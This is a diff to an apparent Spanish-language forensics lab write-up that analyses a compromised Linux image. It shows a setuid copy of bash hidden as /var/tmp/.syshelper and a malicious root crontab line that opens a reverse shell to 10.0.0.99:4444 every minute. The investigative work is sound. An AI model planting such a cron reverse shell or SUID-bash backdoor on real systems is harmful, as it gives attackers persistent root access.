@@ -220,12 +220,24 @@ var/tmp/.syshelper: setuid, setgid ELF 64-bit LSB pie executable, x86-64, versio
 
 Es un ELF dinámico, stripped de 1.39 MB, sin símbolos, lo que dificulta el análisis
 
+Analizando los permisos del binario:
+
 ```bash
 ┌──(root㉿kali)-[/mnt/dirtyfrag]
 └─# stat -c '%a %A %U:%G %n' var/tmp/.syshelper              
 6755 -rwsr-sr-x kali:kali var/tmp/.syshelper
 ```
 
+
+```bash
+┌──(kali㉿kali)-[/mnt/dirtyfrag]
+└─$ sha256sum usr/bash
+2c336c63e26881d2f02f34379024e7c314bce572c08cbaa319bacbbec29f93ed  usr/bash
+                                                                                                                                                                                            
+┌──(kali㉿kali)-[/mnt/dirtyfrag]
+└─$ sha256sum var/tmp/.syshelper
+2c336c63e26881d2f02f34379024e7c314bce572c08cbaa319bacbbec29f93ed  var/tmp/.syshelper
+``` 
 
 number, such as 3, 17, or 4567
 
@@ -239,3 +251,32 @@ Submit Task
 Task 13
 What is the exact full line of the malicious cron entry? Include every field from the schedule to the end of the command.
 
+```bash
+┌──(kali㉿kali)-[/mnt/dirtyfrag]
+└─$ cat etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root /bin/bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
+
+```
